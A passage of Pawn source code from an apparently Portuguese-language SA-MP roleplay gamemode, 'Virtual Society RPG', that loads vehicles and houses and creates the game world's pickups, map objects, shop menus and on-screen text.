		    model = RandomBikeModel();

		if(model_type == MODEL_TYPE_AIR)
		    model = RandomAirModel();
		    
		if(model_type == MODEL_TYPE_BOAT)
		    model = RandomBoatModel();
		    
		colour1 = random(300);
		colour2 = random(300);
		format(string, sizeof string, "Modelo: %s\nValor: $%d,00 dólares", Vehicles[model - 400][vehModel], Vehicles[model - 400][vehValue]);
		VehiclesForSale[veh][osText] = Create3DTextLabel(string, COLOUR_GREEN, 0.0, 0.0, 0.0, 30.0, 0);
		VehiclesForSale[veh][osColours] = ((colour1 & 0xFFFF) << 16) | (colour2 & 0xFFFF);
		VehiclesForSale[veh][osVehId] = CreateVehicle(model, VehiclesForSale[veh][osX], VehiclesForSale[veh][osY], VehiclesForSale[veh][osZ], VehiclesForSale[veh][osA], colour1, colour2, -1);
		Attach3DTextLabelToVehicle(VehiclesForSale[veh][osText], VehiclesForSale[veh][osVehId], 0.0, 0.0, 1.5);
	}
	
    //Veículos dos jogadores
    new vpath[128];
    new vehid, sysid;

	sysid = 0;
	vpath = GetSysVehicleFilePath(sysid);

	while(fexist(vpath))
	{
	    new pos[128];
		new colours, colour1, colour2, idx;
		new Float:X, Float:Y, Float:Z, Float:A;

		colours = hGetInt(vpath, "Colours");
        colour1 = (colours >> 16) & 0xFFFF;
		colour2 = (colours & 0xFFFF);
		pos = hGetString(vpath, "Position");
        X = floatstr(strtok(pos, idx, ','));
		Y = floatstr(strtok(pos, idx, ','));
		Z = floatstr(strtok(pos, idx, ','));
		A = floatstr(strtok(pos, idx, ','));
	
		vehid = CreateVehicle(hGetInt(vpath, "Model"), X, Y, Z, A, colour1, colour2, -1);
		VehicleId[sysid] = vehid;
		SetVehicleNumberPlate(vehid, hGetString(vpath, "NumberPlate"));
		LoadVehicleComponents(vehid);
		
		++sysid;
        vpath = GetSysVehicleFilePath(sysid);
	}
	
	MaxPlayerVeh = CreateVehicle(400, 0.0, 0.0, 0.0, 0.0, 0, 0, 0);
    DestroyVehicle(MaxPlayerVeh);
	MaxPlayerVeh -= MaxServerVeh;
    
    printf("Veiculos carregados [Servidor: %d] [Jogadores: %d] [A venda: %d] [Total: %d]", MaxServerVeh, MaxPlayerVeh - sizeof VehiclesForSale, sizeof VehiclesForSale, GetVehicles());
    
    //----------------------------------------------ENTRADAS----------------------------------------------
    
	for(new e = 0; e < sizeof Enters; e++)
	{
	    new int;

		int = Enters[e][intId];
	    
	    if(Enters[e][enterVirtualWorld] == 0)
	        AddStaticPickup(Ints[int][intPickupId], 1, Ints[int][intX], Ints[int][intY], Ints[int][intZ]);
	    
	    AddStaticPickup(Ints[int][intPickupId], 1, Enters[e][enterX], Enters[e][enterY], Enters[e][enterZ]);
	    
	    if(strlen(Ints[int][intName]) > 0)
	    	Create3DTextLabel(Ints[int][intName], COLOUR_GREEN | 0xFF, Enters[e][enterX], Enters[e][enterY], Enters[e][enterZ] + 0.7, 30.0, 0);
	}
	
	print("Entradas (Pickups e Textos 3D) criadas.");
	
	//----------------------------------------------EMPRESAS----------------------------------------------
	
	for(new i = 1; i < sizeof Companies; i++)
	{
	    AddStaticPickup(1239, 1, Companies[i][cX], Companies[i][cY], Companies[i][cZ]);
	    Create3DTextLabel(Jobs[Companies[i][cJob]][jobName], COLOUR_WHITE | 0xFF, Companies[i][cX], Companies[i][cY], Companies[i][cZ] + 0.7, 30.0, 0);
	}
	
	print("Empresas (Pickups e Textos 3D) criadas.");
	
	//----------------------------------------------AREAS----------------------------------------------

	for(new a = 0; a < sizeof Areas; a++)
	{
		if(Areas[a][areaPickupId] != 0)
		{
	    	AddStaticPickup(Areas[a][areaPickupId], 1, Areas[a][areaX], Areas[a][areaY], Areas[a][areaZ]);
	    	Create3DTextLabel(Areas[a][areaName], COLOUR_GREEN | 0xFF, Areas[a][areaX], Areas[a][areaY], Areas[a][areaZ] + 0.7, 30.0, 0);
		}
		
		if(Areas[a][areaGangZone] != 0)
		{
		    Areas[a][areaGangZone] = GangZoneCreate(	Areas[a][areaX] - (Areas[a][areaRadi] / 2),
														Areas[a][areaY] - (Areas[a][areaRadi] / 2),
														Areas[a][areaX] + (Areas[a][areaRadi] / 2),
														Areas[a][areaY] + (Areas[a][areaRadi] / 2)	);
		    AreasGangZones++;
		}
		
		else
		    Areas[a][areaGangZone] = INVALID_GANG_ZONE;
	}

	print("Areas (Pickups e Textos 3D) criadas.");
	
	//---------------------------------------------GANGZONES--------------------------------------------
	
	for(new z = 0; z < sizeof GangZones; z++)
	    GangZones[z][gzId] = GangZoneCreate(GangZones[z][gzMinX], GangZones[z][gzMinY], GangZones[z][gzMaxX], GangZones[z][gzMaxY]);
	
	//----------------------------------------------OBJETOS---------------------------------------------

	//Porta do Restaurante
	CreateObject(1508, 683.0581, -450.4232, -24.9171, 0.0, 0.0, 89.0463);
	
	//Porta da Seguradora
	CreateObject(1506, 2160.3830, 1603.3161, 998.9749, 0.0, 0.0, 270.8801);
	
	//Porta da Loteria
	CreateObject(1504, -2169.5671, 639.9506, 1051.3750, 0.0, 0.0, 179.4449);
	
	//Portas da Cidadela do Crack
	CreateObject(1536, 2577.2478, -1298.9179, 1059.9843, 0.0, 0.0, 270.0559);
	CreateObject(1536, 2577.2978, -1301.8900, 1059.9843, 0.0, 0.0, 90.0559);
	
	//Porta do Hotel (topo)
	CreateObject(1566, 505.9961, -1641.5697, 59.0904, 0.0, 0.0, 180.0875);
	
	//World of Coq
	CreateObject(1557, 453.9380, -16.7348, 1000.1328, 0.0, 0.0, 271.4908);
	CreateObject(1557, 453.9754, -19.5727, 1000.1328, 0.0, 0.0, 89.9242);
	
	//Delegacia
	CreateObject(997, 1544.6853, -1622.5495, 12.6468, 0.0, 0.0, 89.5565);
	CreateObject(997, 1544.5142, -1636.4052, 12.6543, 0.0, 0.0, 90.1831);
	CreateObject(1553, 1590.9246, -1665.2662, 11.0906, 0.0, 0.0, 0.0962);
	CreateObject(1553, 1593.6812, -1665.2662, 11.0906, 0.0, 0.0, 0.0962);
	CreateObject(1553, 1596.4378, -1665.2662, 11.0906, 0.0, 0.0, 0.0962);
	CreateObject(1553, 1599.1944, -1665.2662, 11.0906, 0.0, 0.0, 0.0962);
	CreateObject(1553, 1601.951, -1665.2662, 11.0906, 0.0, 0.0, 0.0962);
	CreateObject(1553, 1604.7076, -1665.2662, 11.0906, 0.0, 0.0, 0.0962);

	//Posto
	CreateObject(1244, 998.6035, -937.6003, 42.0796, 0.0, 0.0, 97.4488);
	CreateObject(1244, 1002.1929, -937.3178, 42.0796, 0.0, 0.0, 97.4488);
	CreateObject(1244, 1005.5864, -936.6509, 42.0796, 0.0, 0.0, 97.4488);
	CreateObject(1244, 1008.8067, -936.3103, 42.0796, 0.0, 0.0, 97.4488);

	//Pay'n'Spray e Modshop
	CreateObject(971, 2071.3769, -1831.8995, 12.8828, 0.0, 0.0, 91.0819);
	CreateObject(969, 2650.8659, -2029.5212, 12.7025, 0.0, 0.0, 181.1012);
	CreateObject(971, 1024.4471, -1029.2124, 31.5649, 0.0, 0.0, 359.0674);
	CreateObject(971, 1042.4412, -1025.9869, 31.7309, 0.0, 0.0, 0.0);
	CreateObject(971, 487.7293,  -1735.0672, 11.2403, 0.0, 0.0, 173.5342);
	CreateObject(971, 720.1002, -462.5610, 16.3437, 0.0, 0.0, 0.2548);
	CreateObject(971, 2387.2038, 1043.4886, 10.2203, 0.0, 0.0, 1.3619);
	CreateObject(971, 1968.3701, 2162.2775, 10.2203, 0.0, 0.0, 270.8880);
	CreateObject(971, -99.8756, 1111.5760, 21.0937, 0.0, 0.0, 359.5729);
	CreateObject(971, -1904.5092, 277.8448, 42.5390, 0.0, 0.0, 359.8333);
	CreateObject(971, -1935.5375, 238.8579, 33.5562, 0.0, 0.0, 1.7126);
	CreateObject(971, -2716.1474, 218.2287, 3.8796, 0.0, 0.0, 89.5002);

	//Basquete
	CreateObject(2114, 2290.3447, -1528.3322, 26.0750, 0.0, 0.0, 268.0926);
	
	//Capture The Flag
	CreateObject(2914, -972.5143, 1061.2030, 1344.6754, 0.0, 0.0, 268.6724);
	CreateObject(2993, -1133.0777, 1057.6383, 1345.4157, 0.0, 0.0, 86.0442);
	CreateObject(1464, -1062.4813, 1076.5786, 1340.2015, 355.0, 3.0, 143.5320);
	CreateObject(1464, -1043.5224, 1041.4187, 1340.1715, 355.0, 1.0, 319.2903);

	//Auto Escola
	CreateObject(1238, 1801.204102, -2039.499512, 12.850002, 0.0, 0.0, 0.0);
	CreateObject(1238, 1802.588989, -2039.746338, 12.851125, 0.0, 0.0, 0.0);
	CreateObject(1238, 1781.893799, -2020.181763, 12.798002, 0.0, 0.0, 0.0);
	CreateObject(1238, 1783.344727, -2020.545410, 12.785471, 0.0, 0.0, 0.0);
	CreateObject(1238, 1785.194336, -2020.852661, 12.786898, 0.0, 0.0, 0.0);
	CreateObject(1238, 1787.009399, -2021.287964, 12.788723, 0.0, 0.0, 0.0);
	CreateObject(1238, 1788.512207, -2021.978394, 12.796572, 0.0, 0.0, 0.0);
	CreateObject(1238, 1782.145142, -2026.361938, 12.803642, 0.0, 0.0, 0.0);
	CreateObject(1238, 1783.982422, -2027.169922, 12.806655, 0.0, 0.0, 0.0);
	CreateObject(1238, 1785.295532, -2028.530884, 12.811297, 0.0, 0.0, 0.0);
	CreateObject(1238, 1785.799438, -2030.528931, 12.817763, 0.0, 0.0, 0.0);
	CreateObject(1238, 1789.897339, -2023.202026, 12.800632, 0.0, 0.0, 0.0);
	CreateObject(1238, 1790.991455, -2024.516602, 12.799944, 0.0, 0.0, 0.0);
	CreateObject(1238, 1791.009155, -2026.243530, 12.805431, 0.0, 0.0, 0.0);
	CreateObject(1238, 1791.240234, -2027.927490, 12.810834, 0.0, 0.0, 0.0);
	CreateObject(1238, 1791.393066, -2029.639771, 12.816306, 0.0, 0.0, 0.0);
	CreateObject(1238, 1791.299316, -2031.213135, 12.821278, 0.0, 0.0, 0.0);
	CreateObject(1238, 1786.086548, -2032.447754, 12.823925, 0.0, 0.0, 0.0);
	CreateObject(1238, 1786.505859, -2034.307129, 12.829929, 0.0, 0.0, 0.0);
	CreateObject(1238, 1787.566040, -2035.928833, 12.835338, 0.0, 0.0, 0.0);
	CreateObject(1238, 1789.317871, -2036.870117, 12.838754, 0.0, 0.0, 0.0);
	CreateObject(1238, 1796.921265, -2033.386475, 12.829550, 0.0, 0.0, 0.0);
	CreateObject(1238, 1791.195923, -2037.207642, 12.840282, 0.0, 0.0, 0.0);
	CreateObject(1238, 1793.254272, -2036.817261, 12.839546, 0.0, 0.0, 0.0);
	CreateObject(1238, 1791.400879, -2022.925293, 12.805038, 0.0, 0.0, 0.0);
	CreateObject(1238, 1796.382568, -2034.677856, 12.833519, 0.0, 0.0, 0.0);
	CreateObject(1238, 1796.848999, -2031.981567, 12.825073, 0.0, 0.0, 0.0);
	CreateObject(1238, 1796.609619, -2029.139160, 12.815990, 0.0, 0.0, 0.0);
	CreateObject(1238, 1796.681885, -2027.382446, 12.820515, 0.0, 0.0, 0.0);
	CreateObject(1238, 1792.750000, -2021.701538, 12.808992, 0.0, 0.0, 0.0);
	CreateObject(1238, 1794.129272, -2021.274048, 12.813034, 0.0, 0.0, 0.0);
	CreateObject(1238, 1796.046387, -2021.083862, 12.818651, 0.0, 0.0, 0.0);
	CreateObject(1238, 1797.945679, -2021.199829, 12.824218, 0.0, 0.0, 0.0);
	CreateObject(1238, 1799.659912, -2022.042358, 12.829241, 0.0, 0.0, 0.0);
	CreateObject(1238, 1801.110962, -2023.458252, 12.833496, 0.0, 0.0, 0.0);
	CreateObject(1238, 1802.074219, -2031.384277, 12.836315, 0.0, 0.0, 0.0);
	CreateObject(1238, 1802.047363, -2027.271729, 12.836237, 0.0, 0.0, 0.0);
	CreateObject(1238, 1802.038940, -2028.650757, 12.836212, 0.0, 0.0, 0.0);
	CreateObject(1238, 1802.046631, -2030.079468, 12.836235, 0.0, 0.0, 0.0);
	CreateObject(1238, 1799.863525, -2036.586182, 12.840427, 0.0, 0.0, 0.0);
	CreateObject(1238, 1801.527222, -2037.319214, 12.843159, 0.0, 0.0, 0.0);
	CreateObject(1238, 1803.593994, -2037.380005, 12.843859, 0.0, 0.0, 0.0);
	CreateObject(1238, 1805.268799, -2036.813477, 12.842470, 0.0, 0.0, 0.0);
	CreateObject(1238, 1806.919189, -2035.852783, 12.850513, 0.0, 0.0, 0.0);
	CreateObject(1238, 1807.848267, -2034.505859, 12.853235, 0.0, 0.0, 0.0);
	CreateObject(1238, 1808.010010, -2032.711182, 12.853710, 0.0, 0.0, 0.0);
	CreateObject(1238, 1808.021240, -2030.948364, 12.853745, 0.0, 0.0, 0.0);
	CreateObject(1238, 1808.099976, -2029.338745, 12.853972, 0.0, 0.0, 0.0);
	CreateObject(1238, 1808.128906, -2027.839844, 12.854059, 0.0, 0.0, 0.0);
	CreateObject(1238, 1808.153931, -2025.434937, 12.854133, 0.0, 0.0, 0.0);
	CreateObject(1238, 1806.340820, -2020.720215, 12.848819, 0.0, 0.0, 0.0);
	CreateObject(1238, 1811.948608, -2020.740356, 12.867365, 0.0, 0.0, 0.0);
	CreateObject(1238, 1804.853149, -2021.300415, 12.844460, 0.0, 0.0, 0.0);
	CreateObject(1238, 1803.535889, -2022.358276, 12.840599, 0.0, 0.0, 0.0);
	CreateObject(1238, 1802.734741, -2023.533325, 12.838251, 0.0, 0.0, 0.0);
	CreateObject(1238, 1809.504395, -2025.368408, 12.858090, 0.0, 0.0, 0.0);
	CreateObject(1238, 1810.783203, -2025.330811, 12.863096, 0.0, 0.0, 0.0);
	CreateObject(1238, 1810.711060, -2020.742065, 12.862831, 0.0, 0.0, 0.0);
	CreateObject(1238, 1807.816284, -2020.517822, 12.853143, 0.0, 0.0, 0.0);
	CreateObject(1238, 1811.984009, -2025.365601, 12.867494, 0.0, 0.0, 0.0);
	CreateObject(1238, 1809.219116, -2020.570313, 12.857367, 0.0, 0.0, 0.0);
	CreateObject(1238, 1802.014404, -2024.683472, 12.836141, 0.0, 0.0, 0.0);
	CreateObject(1238, 1808.122559, -2026.637451, 12.854041, 0.0, 0.0, 0.0);
	CreateObject(1238, 1802.039917, -2026.032471, 12.836216, 0.0, 0.0, 0.0);
	CreateObject(1238, 1794.981079, -2036.052002, 12.837538, 0.0, 0.0, 0.0);
	CreateObject(1238, 1798.530884, -2035.673828, 12.837204, 0.0, 0.0, 0.0);
	CreateObject(1238, 1797.521484, -2034.509766, 12.833261, 0.0, 0.0, 0.0);
	CreateObject(1238, 1796.714233, -2030.510864, 12.820371, 0.0, 0.0, 0.0);
	CreateObject(1238, 1804.268799, -2040.190430, 12.852946, 0.0, 0.0, 0.0);
	CreateObject(1238, 1805.923584, -2040.304199, 12.853710, 0.0, 0.0, 0.0);
	CreateObject(1238, 1807.644897, -2040.656738, 12.855249, 0.0, 0.0, 0.0);
	CreateObject(1238, 1809.008423, -2041.482056, 12.858203, 0.0, 0.0, 0.0);
	CreateObject(1238, 1810.321289, -2042.502319, 12.861763, 0.0, 0.0, 0.0);
	CreateObject(1238, 1811.429932, -2043.540161, 12.872149, 0.0, 0.0, 0.0);
	CreateObject(1238, 1812.079956, -2045.313721, 12.871353, 0.0, 0.0, 0.0);
	CreateObject(1238, 1812.010620, -2047.065430, 12.871441, 0.0, 0.0, 0.0);
	CreateObject(1238, 1809.966187, -2050.147461, 12.873938, 0.0, 0.0, 0.0);
	CreateObject(1238, 1808.550537, -2051.330811, 12.875666, 0.0, 0.0, 0.0);
	CreateObject(1238, 1806.803955, -2052.094238, 12.877796, 0.0, 0.0, 0.0);
	CreateObject(1238, 1805.096436, -2052.402588, 12.879881, 0.0, 0.0, 0.0);
	CreateObject(1238, 1803.071899, -2052.508057, 12.882355, 0.0, 0.0, 0.0);
	CreateObject(1238, 1801.269409, -2052.416748, 12.884556, 0.0, 0.0, 0.0);
	CreateObject(1238, 1811.162109, -2048.881104, 12.872478, 0.0, 0.0, 0.0);
	CreateObject(1238, 1804.228516, -2046.519287, 12.880941, 0.0, 0.0, 0.0);
	CreateObject(1238, 1802.216309, -2046.598755, 12.879358, 0.0, 0.0, 0.0);
	CreateObject(1238, 1800.641602, -2046.568726, 12.878866, 0.0, 0.0, 0.0);
	CreateObject(1238, 1799.001587, -2046.303467, 12.877560, 0.0, 0.0, 0.0);
	CreateObject(1238, 1796.197876, -2046.144409, 12.876331, 0.0, 0.0, 0.0);
	CreateObject(1238, 1797.589966, -2046.322998, 12.877281, 0.0, 0.0, 0.0);
	CreateObject(1238, 1796.033936, -2047.975708, 12.882553, 0.0, 0.0, 0.0);
	CreateObject(1238, 1795.825317, -2049.866699, 12.891201, 0.0, 0.0, 0.0);
	CreateObject(1238, 1795.774170, -2051.532959, 12.891264, 0.0, 0.0, 0.0);
	CreateObject(1238, 1797.459351, -2051.976563, 12.889206, 0.0, 0.0, 0.0);
	CreateObject(1238, 1799.098999, -2052.164551, 12.887205, 0.0, 0.0, 0.0);
	CreateObject(1238, 1799.024780, -2039.382813, 12.849102, 0.0, 0.0, 0.0);
	CreateObject(1238, 1796.825562, -2039.410034, 12.848650, 0.0, 0.0, 0.0);
	CreateObject(1238, 1794.811646, -2039.253540, 12.847662, 0.0, 0.0, 0.0);
	CreateObject(1238, 1773.959717, -2027.003174, 12.803680, 0.0, 0.0, 0.0);
	CreateObject(1238, 1776.050171, -2026.943604, 12.804001, 0.0, 0.0, 0.0);
	CreateObject(1238, 1774.951660, -2026.389282, 12.801972, 0.0, 0.0, 0.0);
	CreateObject(1238, 1773.730591, -2028.059448, 12.806976, 0.0, 0.0, 0.0);
	CreateObject(1238, 1776.413330, -2028.022583, 12.807513, 0.0, 0.0, 0.0);
	CreateObject(1238, 1774.977539, -2031.121094, 12.817000, 0.0, 0.0, 0.0);
	CreateObject(1238, 1774.968750, -2034.834473, 12.828785, 0.0, 0.0, 0.0);
	CreateObject(1238, 1775.009033, -2038.591431, 12.840725, 0.0, 0.0, 0.0);
	CreateObject(1238, 1775.084351, -2042.328735, 12.852606, 0.0, 0.0, 0.0);
	CreateObject(1238, 1775.043945, -2046.499390, 12.865835, 0.0, 0.0, 0.0);
	CreateObject(1238, 1775.239868, -2050.690186, 12.886753, 0.0, 0.0, 0.0);
	
	//Vacas
	Cows[0] = CreateObject(16442, -1093.0337, -1275.2739, 129.2188, 0.0, 0.0, 0.0);
	Cows[1] = CreateObject(16442, -1090.6830, -1273.4948, 129.2188, 0.0, 0.0, 0.0);
	Cows[2] = CreateObject(16442, -1092.2952, -1270.1226, 129.2188, 0.0, 0.0, 0.0);
	Cows[3] = CreateObject(16442, -1098.5670, -1272.1857, 129.2188, 0.0, 0.0, 0.0);
	Cows[4] = CreateObject(16442, -1094.9755, -1277.0985, 129.2188, 0.0, 0.0, 0.0);
	Cows[5] = CreateObject(16442, -1085.9725, -1277.5209, 129.2188, 0.0, 0.0, 0.0);
	Cows[6] = CreateObject(16442, -1083.4242, -1272.7769, 129.2188, 0.0, 0.0, 0.0);
	Cows[7] = CreateObject(16442, -1098.8875, -1274.7876, 129.2188, 0.0, 0.0, 0.0);
	Cows[8] = CreateObject(16442, -1086.1898, -1270.3119, 129.2188, 0.0, 0.0, 0.0);
	
	//Portões
	for(new g = 0; g < sizeof Gates; g++)
	    Gates[g][gObjectId] = CreateObject(Gates[g][gModel], Gates[g][gX], Gates[g][gY], Gates[g][gZ], Gates[g][gRX], Gates[g][gRY], Gates[g][gRZ]);
	
	//Cameras de seguranca
	for(new sec = 0; sec < sizeof SecurityCameras; sec++)
	{
	    SecurityCameras[sec][secObjectId] = CreateObject(1616, SecurityCameras[sec][secX], SecurityCameras[sec][secY], SecurityCameras[sec][secZ], SecurityCameras[sec][secRX], SecurityCameras[sec][secRY], SecurityCameras[sec][secRZ]);
	    SecurityCameras[sec][secZoom] = 0.0;
	}
	
	//Terminais
	for(new bt = 0; bt < sizeof BusTerminals; bt++)
		BusTerminals[bt][btObj] = CreateObject(1257, BusTerminals[bt][btX], BusTerminals[bt][btY], BusTerminals[bt][btZ], BusTerminals[bt][btRX], BusTerminals[bt][btRY], BusTerminals[bt][btRZ]);
	
	print("Objetos criados.");

	//----------------------------------------------CASAS----------------------------------------------
	
	//Casas
	LoadHouses();

	printf("Casas carregadas [Total: %d]", MaxHouse);
	
	//----------------------------------------------MENUS----------------------------------------------
	
	Bank[0] = CreateMenu("Opcoes", 1, 20, 120, 100);
	
	if(IsValidMenu(Bank[0]))
	{
	    AddMenuItem(Bank[0], 0, "Sacar");
	    AddMenuItem(Bank[0], 0, "Depositar");
	}
	
	Bank[1] = CreateMenu("Quantidade", 2, 20, 120, 100, 60);
	
	if(IsValidMenu(Bank[1]))
	{
	    SetMenuColumnHeader(Bank[1], 0, "Saldo:");
	    AddMenuItem(Bank[1], 0, "$1,00");
	    AddMenuItem(Bank[1], 0, "$5,00");
	    AddMenuItem(Bank[1], 0, "$10,00");
	    AddMenuItem(Bank[1], 0, "$50,00");
	    AddMenuItem(Bank[1], 0, "$100,00");
	    AddMenuItem(Bank[1], 0, "$500,00");
	    AddMenuItem(Bank[1], 0, "$1000,00");
	    AddMenuItem(Bank[1], 0, "$5000,00");
	    AddMenuItem(Bank[1], 0, "$10000,00");
	    AddMenuItem(Bank[1], 0, "$50000,00");
	    AddMenuItem(Bank[1], 0, "$100000,00");
	}
	
	Guns[0] = CreateMenu("Armas", 1, 20, 150, 90);
	
	if(IsValidMenu(Guns[0]))
	{
	    for(new g = 2; g < 8; g++)
	        AddMenuItem(Guns[0], 0, WeaponSlots[g]);
	    
	    AddMenuItem(Guns[0], 0, "Explosivos");
	    AddMenuItem(Guns[0], 0, "Outros");
	}

	for(new m = 1; m < 7; m++)
	{
	    Guns[m] = CreateMenu(WeaponSlots[m+1], 2, 20, 150, 100, 40);
	    
	    if(IsValidMenu(Guns[m]))
	    {
	        SetMenuColumnHeader(Guns[m], 0, "Arma:");
	    	SetMenuColumnHeader(Guns[m], 1, "Valor:");
	    
	        for(new g = 0; g < sizeof Weapons; g++)
	        {
	            if(!IsForbiddenWeapon(g) && Weapons[g][wSlot] == m+1)
				{
				    new cost[128];
   	   				format(cost, sizeof cost, "$%d,00", Weapons[g][wValue]);
	             	AddMenuItem(Guns[m], 0, Weapons[g][wName]);
					AddMenuItem(Guns[m], 1, cost);
				}
	        }
		}
	}
	
	Guns[7] = CreateMenu("Explosivos", 2, 20, 150, 100, 40);
 	
	if(IsValidMenu(Guns[7]))
	{
	    SetMenuColumnHeader(Guns[7], 0, "Explosivo:");
 		SetMenuColumnHeader(Guns[7], 1, "Valor:");
 	
		for(new exp = 0; exp < sizeof Explosives; exp++)
		{
		    new cost[128];
		    format(cost, sizeof cost, "$%d,00", Explosives[exp][expValue]);
		    AddMenuItem(Guns[7], 0, Explosives[exp][expName]);
		    AddMenuItem(Guns[7], 1, cost);
		}
	}
	
	Guns[8] = CreateMenu("Outros", 2, 20, 150, 100, 40);
	
	if(IsValidMenu(Guns[8]))
	{
	    SetMenuColumnHeader(Guns[8], 0, "Item:");
 		SetMenuColumnHeader(Guns[8], 1, "Valor:");
 	
		AddMenuItem(Guns[8], 0, "Colete");
		AddMenuItem(Guns[8], 1, "$300,00");
	}
	
	Dildos = CreateMenu("Sex Shop", 2, 20, 150, 100, 40);

	if(IsValidMenu(Dildos))
	{
	    SetMenuColumnHeader(Dildos, 0, "Item:");
    	SetMenuColumnHeader(Dildos, 1, "Valor:");

    	for(new g = 10; g < 14; g++)
     	{
     	    if(!IsForbiddenWeapon(g))
         	{
         	    new cost[128];
  				format(cost, sizeof cost, "$%d,00", Weapons[g][wValue]);
				AddMenuItem(Dildos, 0, Weapons[g][wName]);
				AddMenuItem(Dildos, 1, cost);
   			}
     	}
	}
	
	Hotel = CreateMenu("Hotel", 2, 20, 150, 100, 40);
	
	if(IsValidMenu(Hotel))
	{
	    SetMenuColumnHeader(Hotel, 0, "Opcao:");
    	SetMenuColumnHeader(Hotel, 1, "Valor:");
    	AddMenuItem(Hotel, 0, "Hospedar");
    	AddMenuItem(Hotel, 1, "$30,00p/dia");
    	AddMenuItem(Hotel, 0, "Nascer");
    	AddMenuItem(Hotel, 0, "Sair");
	}
	
	Toys = CreateMenu("Brinquedos", 2, 20, 150, 100, 40);
	
	if(IsValidMenu(Toys))
	{
	    SetMenuColumnHeader(Toys, 0, "Brinquedo:");
 		SetMenuColumnHeader(Toys, 1, "Valor:");
 		
	    for(new rc = 0; rc < sizeof RCs; rc++)
	    {
	        new id, cost[128];
	        
	        id = RCs[rc] - 400;
	        format(cost, sizeof cost, "$%d,00", Vehicles[id][vehValue]);
	        
	        AddMenuItem(Toys, 0, Vehicles[id][vehModel]);
	        AddMenuItem(Toys, 1, cost);
	    }
	    
	    AddMenuItem(Toys, 0, "Recarregar");
     	AddMenuItem(Toys, 1, "$200,00");
	}
	
	Itens = CreateMenu("Itens", 2, 20, 100, 100, 50);
	
	if(IsValidMenu(Itens))
	{
	    SetMenuColumnHeader(Itens, 0, "Item:");
 		SetMenuColumnHeader(Itens, 1, "Valor:");
 		
	    for(new it = 0; it < sizeof ItemList; it++)
	    {
	        new cost[128];
	        
			format(cost, sizeof cost, "$%d,00", ItemList[it][itValue]);
			
			AddMenuItem(Itens, 0, ItemList[it][itName]);
			AddMenuItem(Itens, 1, cost);
	    }
	}
	
	Donuts = CreateMenu("Menu", 2, 20, 150, 100, 40);

 	if(IsValidMenu(Donuts))
 	{
 	    SetMenuColumnHeader(Donuts, 0, "Donut:");
 		SetMenuColumnHeader(Donuts, 1, "$40,00");
 	
 		for(new d = 0; d < sizeof DonutsFlavor; d++)
 		    AddMenuItem(Donuts, 0, DonutsFlavor[d]);
	}
	
	Pizzas = CreateMenu("Menu", 2, 20, 150, 100, 40);
	
	if(IsValidMenu(Pizzas))
 	{
 	    SetMenuColumnHeader(Pizzas, 0, "Pizza:");
 		SetMenuColumnHeader(Pizzas, 1, "Valor:");

 		for(new p = 0; p < sizeof PizzasFlavor; p++)
 		{
 		    new cost[128];

			format(cost, sizeof cost, "$%d,00", PizzasFlavor[p][foodValue]);
			
 		    AddMenuItem(Pizzas, 0, PizzasFlavor[p][foodName]);
 		    AddMenuItem(Pizzas, 1, cost);
 		}
	}
	
	Chickens = CreateMenu("Menu", 2, 20, 150, 100, 40);

	if(IsValidMenu(Chickens))
 	{
 	    SetMenuColumnHeader(Chickens, 0, "Alimento:");
 		SetMenuColumnHeader(Chickens, 1, "Valor:");

 		for(new c = 0; c < sizeof ChickensFlavor; c++)
 		{
 		    new cost[128];

			format(cost, sizeof cost, "$%d,00", ChickensFlavor[c][foodValue]);
			
 		    AddMenuItem(Chickens, 0, ChickensFlavor[c][foodName]);
 		    AddMenuItem(Chickens, 1, cost);
 		}
	}
	
	Burgers = CreateMenu("Menu", 2, 20, 150, 100, 40);

	if(IsValidMenu(Burgers))
 	{
 	    SetMenuColumnHeader(Burgers, 0, "Sanduiche:");
 		SetMenuColumnHeader(Burgers, 1, "Valor:");

 		for(new b = 0; b < sizeof BurgersFlavor; b++)
 		{
 		    new cost[128];

			format(cost, sizeof cost, "$%d,00", BurgersFlavor[b][foodValue]);
			
 		    AddMenuItem(Burgers, 0, BurgersFlavor[b][foodName]);
 		    AddMenuItem(Burgers, 1, cost);
 		}
	}
	
	Foods = CreateMenu("Menu", 2, 20, 150, 100, 40);

	if(IsValidMenu(Foods))
 	{
 	    SetMenuColumnHeader(Foods, 0, "Comida:");
 		SetMenuColumnHeader(Foods, 1, "Valor:");

 		for(new f = 0; f < sizeof Food; f++)
 		{
 		    new cost[128];

			format(cost, sizeof cost, "$%d,00", Food[f][foodValue]);
			
 		    AddMenuItem(Foods, 0, Food[f][foodName]);
 		    AddMenuItem(Foods, 1, cost);
 		}
	}
	
	Drinks = CreateMenu("Menu", 2, 20, 150, 100, 40);

	if(IsValidMenu(Drinks))
 	{
 	    SetMenuColumnHeader(Drinks, 0, "Bebida:");
 		SetMenuColumnHeader(Drinks, 1, "Valor:");

 		for(new d = 0; d < sizeof Drink; d++)
 		{
 		    new cost[128];

			format(cost, sizeof cost, "$%d,00", Drink[d][drinkValue]);
			
 		    AddMenuItem(Drinks, 0, Drink[d][drinkName]);
 		    AddMenuItem(Drinks, 1, cost);
 		}
	}
	
	Restaurant = CreateMenu("Menu", 1, 20, 150, 100);
	
	if(IsValidMenu(Restaurant))
 	{
 	    SetMenuColumnHeader(Restaurant, 0, "Item:");
 		AddMenuItem(Restaurant, 0, "Comidas");
 		AddMenuItem(Restaurant, 0, "Bebidas");
 	}
 	
	print("Menus criados.");
	
	//----------------------------------------------TEXTDRAWS----------------------------------------------
	
	new msg[128];
	
#if SHOW_GAMEMODE_LOGO == true

	tdlogo = TextDrawCreate(5.0, 430.5, "~b~Virtual ~y~~h~Society ~w~R~y~~h~P~b~G");
    TextDrawFont(tdlogo, 1);
    TextDrawLetterSize(tdlogo, 0.6, 1.8);
    TextDrawSetShadow(tdlogo, 1);
    TextDrawColour(tdlogo, COLOUR_WHITE);
    TextDrawBackgroundColour(tdlogo, 0x00000099);
    
#endif

#if SHOW_WEEKDAY == true

    tdweek = TextDrawCreate(608.0, 0.8, TEXT(Days[CurrentDay]));
	TextDrawAlignment(tdweek, 3);
	TextDrawFont(tdweek, 3);
	TextDrawLetterSize(tdweek, 0.5, 2.0);
	TextDrawColour(tdweek, 0xFFFFFFE7);
	TextDrawSetOutline(tdweek, 1);
	TextDrawSetProportional(tdweek, 1);
    
#endif

    tdblack = TextDrawCreate(0.0, 0.0, "_");
	TextDrawUseBox(tdblack, true);
	TextDrawBoxColour(tdblack, 0x000000FF);
	TextDrawSetShadow(tdblack, 0);
	TextDrawLetterSize(tdblack, 0.0, 100.0);
	TextDrawTextSize(tdblack, 645.0, 0.0);
	
